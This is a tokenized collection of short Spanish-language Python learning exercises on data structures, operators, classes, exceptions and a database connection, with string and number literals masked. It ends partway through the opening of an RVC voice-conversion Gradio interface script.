<EOL> </s>
<s> class Spiderman : <EOL> def __init__ ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> def lanzar_telaraa ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> def activar_sentido_aracnido ( self , peligro ) : <EOL> if peligro : <EOL> print ( "<STR_LIT>" ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> class MilesMorales ( Spiderman ) : <EOL> def __init__ ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> def lanzar_telaraa ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> return super ( ) . lanzar_telaraa ( ) <EOL> def lanzar_rayitos ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> class SpiderGwen ( Spiderman ) : <EOL> def __init__ ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> def lanzar_telaraa_rosa ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> return super ( ) . lanzar_telaraa ( ) <EOL> class Spidercito ( MilesMorales , SpiderGwen ) : <EOL> def __init__ ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> super ( ) . lanzar_rayitos ( ) <EOL> miles = MilesMorales ( ) <EOL> miles . lanzar_telaraa ( ) <EOL> gwen = SpiderGwen ( ) <EOL> gwen . lanzar_telaraa_rosa ( ) <EOL> spidercito = Spidercito ( ) <EOL> spidercito . lanzar_telaraa_rosa ( ) <EOL> spidercito . activar_sentido_aracnido ( peligro = True ) <EOL> print ( isinstance ( spidercito , Spiderman ) ) <EOL> </s>
<s> dato = "<STR_LIT>" <EOL> print ( dato + dato ) <EOL> dato = <NUM_LIT> <EOL> print ( dato + dato ) <EOL> dato = <NUM_LIT> <EOL> print ( dato + dato ) <EOL> dato = False <EOL> print ( dato + dato ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> cinco = "<STR_LIT>" <EOL> numero = <NUM_LIT> <EOL> print ( float ( cinco ) + numero ) <EOL> nombre = "<STR_LIT>" <EOL> edad = <NUM_LIT> <EOL> print ( '<STR_LIT>' . format ( nombre , edad ) ) <EOL> print ( f'<STR_LIT>' ) <EOL> print ( "<STR_LIT>" + nombre + "<STR_LIT>" + str ( edad ) + "<STR_LIT>" ) <EOL> print ( __name__ ) <EOL> </s>
<s> def puedes_conducir ( edad = <NUM_LIT> ) : <EOL> if edad < <NUM_LIT> : <EOL> return False <EOL> elif edad >= <NUM_LIT> and edad < <NUM_LIT> : <EOL> return True , "<STR_LIT>" <EOL> elif edad >= <NUM_LIT> and edad < <NUM_LIT> : <EOL> return True , "<STR_LIT>" <EOL> else : <EOL> return False <EOL> def tipo_licencia ( tipo_vehiculo = "<STR_LIT>" ) : <EOL> match tipo_vehiculo : <EOL> case "<STR_LIT>" : <EOL> return "<STR_LIT>" <EOL> case "<STR_LIT>" : <EOL> return "<STR_LIT>" <EOL> case "<STR_LIT>" : <EOL> return "<STR_LIT>" <EOL> case _ : <EOL> return False <EOL> </s>
<s> pila = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> print ( pila ) <EOL> pila . append ( <NUM_LIT> ) <EOL> pila . append ( <NUM_LIT> ) <EOL> print ( pila ) <EOL> pila . pop ( ) <EOL> print ( pila ) <EOL> pila . pop ( ) <EOL> print ( pila ) <EOL> pila . pop ( ) <EOL> print ( pila ) <EOL> </s>
<s> import validador as vl <EOL> edad = <NUM_LIT> <EOL> while True : <EOL> try : <EOL> edad = int ( input ( "<STR_LIT>" ) ) <EOL> break <EOL> except ValueError : <EOL> print ( "<STR_LIT>" ) <EOL> if vl . puedes_conducir ( edad ) : <EOL> print ( "<STR_LIT>" ) <EOL> vehiculo = input ( "<STR_LIT>" ) <EOL> tipo = vl . tipo_licencia ( vehiculo ) <EOL> if tipo : <EOL> print ( "<STR_LIT>" , tipo ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> </s>
<s> contactos = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] , <EOL> '<STR_LIT>' : True , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> print ( contactos [ '<STR_LIT>' ] ) <EOL> print ( contactos [ '<STR_LIT>' ] ) <EOL> del contactos [ '<STR_LIT>' ] <EOL> print ( contactos ) <EOL> contactos [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> print ( contactos ) <EOL> contactos [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> print ( contactos ) <EOL> print ( list ( contactos ) ) <EOL> print ( sorted ( contactos ) ) <EOL> print ( contactos ) <EOL> print ( '<STR_LIT>' in contactos ) <EOL> print ( '<STR_LIT>' in contactos ) <EOL> print ( "<STR_LIT>" ) <EOL> telefonos = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> } <EOL> celulares = dict ( [ <EOL> ( '<STR_LIT>' , "<STR_LIT>" ) , <EOL> ( '<STR_LIT>' , <NUM_LIT> ) , <EOL> ( '<STR_LIT>' , "<STR_LIT>" ) , <EOL> ( '<STR_LIT>' , "<STR_LIT>" ) , <EOL> ( '<STR_LIT>' , "<STR_LIT>" ) <EOL> ] ) <EOL> print ( celulares ) <EOL> celulares = dict ( <EOL> camara = "<STR_LIT>" , <EOL> bateria = <NUM_LIT> , <EOL> pantalla = "<STR_LIT>" <EOL> ) <EOL> print ( celulares ) <EOL> mi_diccionario = { numero : numero ** <NUM_LIT> for numero in ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) } <EOL> print ( mi_diccionario ) <EOL> pokemones = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( pokemones . items ( ) ) <EOL> for nombre , tipo in pokemones . items ( ) : <EOL> print ( nombre , tipo ) <EOL> pokemones_datos = pokemones . items ( ) <EOL> print ( list ( enumerate ( [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] ) ) ) <EOL> for i , v in enumerate ( [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] ) : <EOL> print ( i , v ) <EOL> pregunta = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> repuestas = [ '<STR_LIT>' , '<STR_LIT>' ] <EOL> asociacion = zip ( pregunta , repuestas ) <EOL> print ( asociacion ) <EOL> for p , r in asociacion : <EOL> print ( p , r ) <EOL> print ( pokemones . keys ( ) ) <EOL> print ( pokemones . values ( ) ) <EOL> print ( pokemones . items ( ) ) <EOL> </s>
<s> numero1 = <NUM_LIT> <EOL> numero2 = <NUM_LIT> <EOL> numero3 = "<STR_LIT>" <EOL> numero4 = "<STR_LIT>" <EOL> print ( "<STR_LIT>" ) <EOL> print ( numero1 + numero2 ) <EOL> print ( numero3 + numero4 ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( numero1 - numero2 ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( numero1 * numero2 ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( numero2 / numero1 ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( numero2 % numero1 ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( <NUM_LIT> ** <NUM_LIT> ) <EOL> print ( numero2 ** numero1 ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( numero2 // numero1 ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( numero1 > numero2 ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( numero1 < numero2 ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( numero1 == numero2 ) <EOL> print ( <NUM_LIT> == <NUM_LIT> ) <EOL> print ( <NUM_LIT> == "<STR_LIT>" ) <EOL> print ( <NUM_LIT> == <NUM_LIT> ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( numero2 > numero1 ) <EOL> print ( numero1 == numero2 ) <EOL> print ( numero2 >= numero2 ) <EOL> print ( numero2 >= numero1 ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( numero2 < numero1 ) <EOL> print ( numero1 == numero2 ) <EOL> print ( numero2 <= numero2 ) <EOL> print ( numero2 <= numero1 ) <EOL> print ( numero1 <= numero2 ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( numero1 != numero2 ) <EOL> print ( <NUM_LIT> != <NUM_LIT> ) <EOL> print ( <NUM_LIT> != "<STR_LIT>" ) <EOL> print ( <NUM_LIT> != <NUM_LIT> ) <EOL> a = <NUM_LIT> <EOL> b = <NUM_LIT> <EOL> print ( "<STR_LIT>" ) <EOL> print ( a & b ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( a | b ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( a ^ b ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( ~ a ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( a >> b ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( a << b ) <EOL> print ( b << a ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> costo_cigarros = <NUM_LIT> <EOL> dinero = <NUM_LIT> <EOL> edad = <NUM_LIT> <EOL> print ( ( dinero >= costo_cigarros ) and ( edad >= <NUM_LIT> ) ) <EOL> print ( True and False ) <EOL> print ( "<STR_LIT>" ) <EOL> costo_cigarros = <NUM_LIT> <EOL> dinero = <NUM_LIT> <EOL> edad = <NUM_LIT> <EOL> print ( ( dinero >= costo_cigarros ) and ( edad >= <NUM_LIT> ) ) <EOL> print ( False or True ) <EOL> print ( "<STR_LIT>" ) <EOL> costo_cigarros = <NUM_LIT> <EOL> dinero = <NUM_LIT> <EOL> edad = <NUM_LIT> <EOL> print ( not ( ( dinero >= costo_cigarros ) and ( edad >= <NUM_LIT> ) ) ) <EOL> print ( not False ) <EOL> print ( not True ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> lista = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> print ( <NUM_LIT> in lista ) <EOL> print ( <NUM_LIT> in lista ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( <NUM_LIT> not in lista ) <EOL> print ( <NUM_LIT> not in lista ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> a = <NUM_LIT> <EOL> b = <NUM_LIT> <EOL> c = <NUM_LIT> <EOL> d = a <EOL> print ( a is b ) <EOL> print ( a is d ) <EOL> print ( a is c ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( a is not b ) <EOL> print ( a is not d ) <EOL> print ( a is not c ) <EOL> a = a + a <EOL> print ( a ) <EOL> print ( d ) <EOL> </s>
<s> tu_dinero = int ( input ( '<STR_LIT>' ) ) <EOL> edad = int ( input ( "<STR_LIT>" ) ) <EOL> cover = <NUM_LIT> <EOL> costo_vip = <NUM_LIT> <EOL> print ( "<STR_LIT>" , edad ) <EOL> if edad >= <NUM_LIT> and tu_dinero >= cover : <EOL> tu_dinero = tu_dinero - cover <EOL> print ( "<STR_LIT>" , cover ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" , tu_dinero ) <EOL> vip = int ( input ( "<STR_LIT>" ) ) <EOL> if vip == <NUM_LIT> and tu_dinero >= costo_vip : <EOL> tu_dinero = tu_dinero - costo_vip <EOL> print ( "<STR_LIT>" , costo_vip ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" , tu_dinero ) <EOL> elif vip == <NUM_LIT> and tu_dinero < costo_vip : <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" , tu_dinero ) <EOL> elif vip == <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" , tu_dinero ) <EOL> elif edad < <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> </s>
<s> lista = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , "<STR_LIT>" , <NUM_LIT> , False , <NUM_LIT> ] <EOL> print ( lista ) <EOL> print ( "<STR_LIT>" ) <EOL> lista . append ( <NUM_LIT> ) <EOL> print ( lista ) <EOL> print ( "<STR_LIT>" ) <EOL> lista2 = [ <NUM_LIT> , True , "<STR_LIT>" , "<STR_LIT>" ] <EOL> lista . extend ( lista2 ) <EOL> print ( lista ) <EOL> print ( "<STR_LIT>" ) <EOL> lista . insert ( <NUM_LIT> , <NUM_LIT> ) <EOL> print ( lista ) <EOL> print ( "<STR_LIT>" ) <EOL> lista . remove ( <NUM_LIT> ) <EOL> lista . remove ( <NUM_LIT> ) <EOL> print ( lista . remove ( '<STR_LIT>' ) ) <EOL> print ( lista ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( lista . pop ( - <NUM_LIT> ) ) <EOL> elemento_eliminado = lista . pop ( <NUM_LIT> ) <EOL> print ( elemento_eliminado ) <EOL> print ( lista ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( lista . index ( <NUM_LIT> ) ) <EOL> print ( lista . index ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) <EOL> print ( "<STR_LIT>" ) <EOL> lista_copia = lista <EOL> lista_medio_metro = lista . copy ( ) <EOL> lista_medio_metro . pop ( ) <EOL> lista . append ( <NUM_LIT> ) <EOL> print ( lista_copia ) <EOL> print ( lista ) <EOL> print ( lista_medio_metro ) <EOL> print ( "<STR_LIT>" ) <EOL> lista . append ( <NUM_LIT> ) <EOL> print ( lista ) <EOL> print ( lista . count ( <NUM_LIT> ) ) <EOL> print ( "<STR_LIT>" ) <EOL> lista . remove ( "<STR_LIT>" ) <EOL> print ( lista ) <EOL> lista . sort ( ) <EOL> print ( lista ) <EOL> lista_palabras = [ "<STR_LIT>" , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> print ( lista_palabras ) <EOL> lista_palabras . sort ( ) <EOL> print ( lista_palabras ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( lista ) <EOL> lista . reverse ( ) <EOL> print ( lista ) <EOL> print ( "<STR_LIT>" ) <EOL> lista . clear ( ) <EOL> print ( lista ) <EOL> </s>
<s> saludo = "<STR_LIT>" <EOL> print ( saludo ) <EOL> saludo = "<STR_LIT>" <EOL> print ( saludo ) <EOL> saludo = <NUM_LIT> <EOL> print ( saludo ) <EOL> </s>
<s> import psycopg2 <EOL> from configparser import ConfigParser <EOL> def leer_config ( archivo = "<STR_LIT>" , seccion = '<STR_LIT>' ) : <EOL> parser = ConfigParser ( ) <EOL> parser . read ( archivo ) <EOL> bd = { } <EOL> if parser . has_section ( seccion ) : <EOL> params = parser . items ( seccion ) <EOL> for param in params : <EOL> bd [ param [ <NUM_LIT> ] ] = param [ <NUM_LIT> ] <EOL> return bd <EOL> def conectar ( ) : <EOL> conexion = None <EOL> try : <EOL> params = leer_config ( ) <EOL> print ( params ) <EOL> print ( "<STR_LIT>" ) <EOL> conexion = psycopg2 . connect ( ** params ) <EOL> cursor = conexion . cursor ( ) <EOL> cursor . execute ( "<STR_LIT>" ) <EOL> version = cursor . fetchone ( ) <EOL> print ( version ) <EOL> cursor . close ( ) <EOL> except ( Exception , psycopg2 . DatabaseError ) as error : <EOL> print ( error ) <EOL> finally : <EOL> if conexion is not None : <EOL> conexion . close ( ) <EOL> print ( "<STR_LIT>" ) <EOL> conectar ( ) <EOL> </s>
<s> def es_primo ( numero ) : <EOL> if numero < <NUM_LIT> : <EOL> return False <EOL> for i in range ( <NUM_LIT> , int ( numero ** <NUM_LIT> ) + <NUM_LIT> ) : <EOL> if numero % i == <NUM_LIT> : <EOL> print ( numero , "<STR_LIT>" , i , "<STR_LIT>" , ( numero / i ) ) <EOL> return False <EOL> return True <EOL> print ( es_primo ( <NUM_LIT> ) ) <EOL> </s>
<s> edad1 = <NUM_LIT> <EOL> class Persona : <EOL> def __init__ ( self , nombre , edad , altura ) : <EOL> self . nombre = nombre <EOL> self . edad = edad <EOL> self . altura = altura <EOL> def leer_edad ( self ) : <EOL> return self . nombre + "<STR_LIT>" + str ( self . edad ) + "<STR_LIT>" <EOL> jesus = Persona ( "<STR_LIT>" , <NUM_LIT> , <NUM_LIT> ) <EOL> print ( jesus . leer_edad ( ) ) <EOL> print ( jesus . altura ) <EOL> mari = Persona ( "<STR_LIT>" , <NUM_LIT> , <NUM_LIT> ) <EOL> print ( mari . leer_edad ( ) ) <EOL> print ( mari . altura ) <EOL> print ( "<STR_LIT>" ) <EOL> class Perro : <EOL> tipo = "<STR_LIT>" <EOL> def __init__ ( self , nombre ) : <EOL> self . nombre = nombre <EOL> self . trucos = [ ] <EOL> def aprender_truco ( self , truco ) : <EOL> self . trucos . append ( truco ) <EOL> puppy = Perro ( "<STR_LIT>" ) <EOL> puppy . aprender_truco ( "<STR_LIT>" ) <EOL> manchas = Perro ( "<STR_LIT>" ) <EOL> manchas . aprender_truco ( "<STR_LIT>" ) <EOL> print ( puppy . tipo ) <EOL> print ( manchas . tipo ) <EOL> print ( puppy . nombre ) <EOL> print ( manchas . nombre ) <EOL> print ( puppy . trucos ) <EOL> print ( manchas . trucos ) <EOL> </s>
<s> status = <NUM_LIT> <EOL> match status : <EOL> case <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> case <NUM_LIT> | <NUM_LIT> | <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> case <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> case <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> case _ : <EOL> print ( "<STR_LIT>" ) <EOL> </s>
<s> from mipaquetote import * <EOL> from mipaquetote . paquetito import * <EOL> modulo2 . funcion2 ( ) <EOL> modulo1 . funcion1 ( ) <EOL> objeto = modulo1 . Clase1 ( ) <EOL> objeto . metodo1 ( ) <EOL> modulo3 . funcion3 ( ) <EOL> </s>
<s> frutas = { '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' } <EOL> print ( frutas ) <EOL> palabra1 = set ( "<STR_LIT>" ) <EOL> print ( palabra1 ) <EOL> lista_frutas = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> lista_frutas = list ( set ( lista_frutas ) ) <EOL> lista_frutas . sort ( ) <EOL> print ( lista_frutas ) <EOL> print ( '<STR_LIT>' in frutas ) <EOL> print ( '<STR_LIT>' in frutas ) <EOL> palabra1 = set ( "<STR_LIT>" ) <EOL> palabra2 = set ( '<STR_LIT>' ) <EOL> print ( palabra1 ) <EOL> print ( palabra2 ) <EOL> print ( palabra1 - palabra2 ) <EOL> print ( palabra2 - palabra1 ) <EOL> print ( palabra1 | palabra2 ) <EOL> print ( palabra1 & palabra2 ) <EOL> print ( palabra1 ^ palabra2 ) <EOL> a = { elemento for elemento in "<STR_LIT>" if elemento not in "<STR_LIT>" } <EOL> print ( a ) <EOL> </s>
<s> import urllib . request as requests <EOL> url = "<STR_LIT>" <EOL> with requests . urlopen ( url ) as response : <EOL> html = response . read ( ) . decode ( ) <EOL> print ( html ) <EOL> </s>
<s> import argparse <EOL> parser = argparse . ArgumentParser ( description = "<STR_LIT>" ) <EOL> parser . add_argument ( '<STR_LIT>' , metavar = '<STR_LIT>' , type = int , nargs = '<STR_LIT>' , help = "<STR_LIT>" ) <EOL> parser . add_argument ( '<STR_LIT>' , dest = "<STR_LIT>" , action = "<STR_LIT>" , const = sum , default = max , help = "<STR_LIT>" ) <EOL> args = parser . parse_args ( ) <EOL> print ( args . accumulate ( args . enteros ) ) <EOL> </s>
<s> print ( <NUM_LIT> + <NUM_LIT> ) <EOL> print ( ( <NUM_LIT> - <NUM_LIT> * <NUM_LIT> ) / <NUM_LIT> ) <EOL> impuesto = <NUM_LIT> / <NUM_LIT> <EOL> precio = <NUM_LIT> <EOL> precio * impuesto <EOL> esta_dormido = False <EOL> status = "<STR_LIT>" if esta_dormido else "<STR_LIT>" <EOL> print ( status ) <EOL> print ( '<STR_LIT>' ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( '<STR_LIT>' ) <EOL> print ( '<STR_LIT>' ) <EOL> print ( r'<STR_LIT>' ) <EOL> print ( ) <EOL> print ( <NUM_LIT> * '<STR_LIT>' + '<STR_LIT>' ) <EOL> print ( <NUM_LIT> * '<STR_LIT>' ) <EOL> print ( '<STR_LIT>' '<STR_LIT>' ) <EOL> print ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> print ( "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" ) <EOL> palabra = "<STR_LIT>" <EOL> print ( palabra [ <NUM_LIT> ] ) <EOL> print ( palabra [ <NUM_LIT> ] ) <EOL> print ( palabra [ - <NUM_LIT> ] ) <EOL> print ( palabra [ - <NUM_LIT> ] ) <EOL> print ( palabra [ - <NUM_LIT> ] ) <EOL> print ( palabra [ <NUM_LIT> ] + palabra [ <NUM_LIT> ] ) <EOL> print ( palabra [ <NUM_LIT> : <NUM_LIT> ] ) <EOL> print ( palabra [ <NUM_LIT> : <NUM_LIT> ] ) <EOL> print ( palabra [ <NUM_LIT> : ] ) <EOL> print ( len ( palabra ) ) <EOL> print ( palabra [ <NUM_LIT> : <NUM_LIT> ] + palabra [ <NUM_LIT> ] ) <EOL> print ( palabra [ <NUM_LIT> : <NUM_LIT> + <NUM_LIT> ] ) <EOL> </s>
<s> def dividir ( a , b ) : <EOL> try : <EOL> resultado = a / b <EOL> print ( "<STR_LIT>" , resultado ) <EOL> except ZeroDivisionError : <EOL> print ( "<STR_LIT>" ) <EOL> finally : <EOL> print ( "<STR_LIT>" ) <EOL> dividir ( <NUM_LIT> , <NUM_LIT> ) <EOL> dividir ( <NUM_LIT> , <NUM_LIT> ) <EOL> </s>
<s> def funcion ( ) : <EOL> raise ExceptionGroup ( "<STR_LIT>" , [ OSError ( <NUM_LIT> ) , SystemError ( <NUM_LIT> ) , <EOL> ExceptionGroup ( "<STR_LIT>" , [ OSError ( <NUM_LIT> ) , RecursionError ( <NUM_LIT> ) ] ) ] ) <EOL> try : <EOL> funcion ( ) <EOL> except * OSError as err : <EOL> print ( "<STR_LIT>" ) <EOL> except * SystemError as err : <EOL> print ( "<STR_LIT>" ) <EOL> except * RecursionError as err : <EOL> print ( "<STR_LIT>" ) <EOL> try : <EOL> raise TypeError ( "<STR_LIT>" ) <EOL> except Exception as error : <EOL> error . add_note ( "<STR_LIT>" ) <EOL> error . add_note ( "<STR_LIT>" ) <EOL> error . add_note ( "<STR_LIT>" ) <EOL> print ( error ) <EOL> def funcion1 ( ) : <EOL> raise OSError ( "<STR_LIT>" ) <EOL> problemas = [ ] <EOL> for i in range ( <NUM_LIT> ) : <EOL> try : <EOL> funcion1 ( ) <EOL> except Exception as error : <EOL> error . add_note ( f"<STR_LIT>" ) <EOL> problemas . append ( error ) <EOL> raise ExceptionGroup ( "<STR_LIT>" , problemas ) <EOL> </s>
<s> def funcion ( ) : <EOL> variable_local = "<STR_LIT>" <EOL> print ( variable_local ) <EOL> funcion ( ) <EOL> def funcion_externa ( ) : <EOL> variable_cierre = "<STR_LIT>" <EOL> def funcion_interna ( ) : <EOL> print ( variable_cierre ) <EOL> funcion_interna ( ) <EOL> funcion_externa ( ) <EOL> variable_global = "<STR_LIT>" <EOL> def funcion1 ( ) : <EOL> print ( variable_global ) <EOL> funcion1 ( ) <EOL> print ( variable_global ) <EOL> print ( len ( [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] ) ) <EOL> </s>
<s> tu_edad = <NUM_LIT> <EOL> while True : <EOL> try : <EOL> tu_edad = int ( input ( "<STR_LIT>" ) ) <EOL> break <EOL> except ValueError : <EOL> pass <EOL> print ( tu_edad ) <EOL> class A ( Exception ) : <EOL> pass <EOL> class B ( A ) : <EOL> pass <EOL> class C ( B ) : <EOL> pass <EOL> for cls in [ A , B , C ] : <EOL> try : <EOL> raise cls ( ) <EOL> except C : <EOL> print ( "<STR_LIT>" ) <EOL> except B : <EOL> print ( "<STR_LIT>" ) <EOL> except A : <EOL> print ( "<STR_LIT>" ) <EOL> try : <EOL> raise Exception ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> except Exception as error : <EOL> print ( type ( error ) ) <EOL> print ( error . args ) <EOL> print ( error ) <EOL> x , y = error . args <EOL> print ( "<STR_LIT>" , x ) <EOL> print ( "<STR_LIT>" , y ) <EOL> </s>
<s> from itertools import groupby <EOL> for key , grupo in groupby ( input ( ) ) : <EOL> print ( '<STR_LIT>' . format ( len ( list ( grupo ) ) , key ) , end = "<STR_LIT>" ) <EOL> </s>
<s> import os <EOL> print ( os . name ) <EOL> print ( os . getcwd ( ) ) <EOL> try : <EOL> os . mkdir ( "<STR_LIT>" ) <EOL> except FileExistsError : <EOL> print ( "<STR_LIT>" ) <EOL> </s>
<s> import random <EOL> def metodo_quicksort ( lista ) : <EOL> if len ( lista ) <= <NUM_LIT> : <EOL> return lista <EOL> else : <EOL> pivote = lista [ len ( lista ) // <NUM_LIT> ] <EOL> menores = [ x for x in lista if x < pivote ] <EOL> iguales = [ x for x in lista if x == pivote ] <EOL> mayores = [ x for x in lista if x > pivote ] <EOL> return metodo_quicksort ( menores ) + iguales + metodo_quicksort ( mayores ) <EOL> lista_aleatoria = [ random . randint ( <NUM_LIT> , <NUM_LIT> ) for _ in range ( <NUM_LIT> ) ] <EOL> print ( lista_aleatoria ) <EOL> print ( metodo_quicksort ( lista_aleatoria ) ) <EOL> </s>
<s> def funcion1 ( ) : <EOL> print ( "<STR_LIT>" ) <EOL> class Clase1 : <EOL> def metodo1 ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> </s>
<s> import os , sys <EOL> import gradio as gr <EOL> import regex as re <EOL> import shutil <EOL> import datetime <EOL> import random <EOL> from core import ( <EOL> run_infer_script , <EOL> run_batch_infer_script , <EOL> ) <EOL> from assets . i18n . i18n import I18nAuto <EOL> from rvc . lib . utils import format_title <EOL> i18n = I18nAuto ( ) <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> model_root = os . path . join ( now_dir , "<STR_LIT>" ) <EOL> audio_root = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" ) <EOL> model_root_relative = os . path . relpath ( model_root , now_dir ) <EOL> audio_root_relative = os . path . relpath ( audio_root , now_dir ) <EOL> sup_audioext = { <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> } <EOL> names = [ <EOL> os . path . join ( root , file ) <EOL> for root , _ , files in os . walk ( model_root_relative , topdown = False ) <EOL> for file in files <EOL> if ( <EOL> file . endswith ( ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> and not ( file . startswith ( "<STR_LIT>" ) or file . startswith ( "<STR_LIT>" ) ) <EOL> ) <EOL> ] <EOL> indexes_list = [ <EOL> os . path . join ( root , name ) <EOL> for root , _ , files in os . walk ( model_root_relative , topdown = False ) <EOL> for name in files <EOL> if name . endswith ( "<STR_LIT>" ) and "<STR_LIT>" not in name <EOL> ] <EOL> audio_paths = [ <EOL> os . path . join ( root , name ) <EOL> for root , _ , files in os . walk ( audio_root_relative , topdown = False ) <EOL> for name in files <EOL> if name . endswith ( tuple ( sup_audioext ) ) <EOL> and root == audio_root_relative <EOL> and "<STR_LIT>" not in name <EOL> ] <EOL> def output_path_fn ( input_audio_path ) : <EOL> original_name_without_extension = os . path . basename ( input_audio_path ) . rsplit ( "<STR_LIT>" , <NUM_LIT> ) [ <EOL> <NUM_LIT> <EOL> ] <EOL> new_name = original_name_without_extension + "<STR_LIT>" <EOL> output_path = os . path . join ( os . path . dirname ( input_audio_path ) , new_name ) <EOL> return output_path <EOL> def change_choices ( ) : <EOL> names = [ <EOL> os . path . join ( root , file ) <EOL> for root , _ , files in os . walk ( model_root_relative , topdown = False ) <EOL> for file in files <EOL> if ( <EOL> file . endswith ( ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> and not ( file . startswith ( "<STR_LIT>" ) or file . startswith ( "<STR_LIT>" ) ) <EOL> ) <EOL> ] <EOL> indexes_list = [ <EOL> os . path . join ( root , name ) <EOL> for root , _ , files in os . walk ( model_root_relative , topdown = False ) <EOL> for name in files <EOL> if name . endswith ( "<STR_LIT>" ) and "<STR_LIT>" not in name <EOL> ] <EOL> audio_paths = 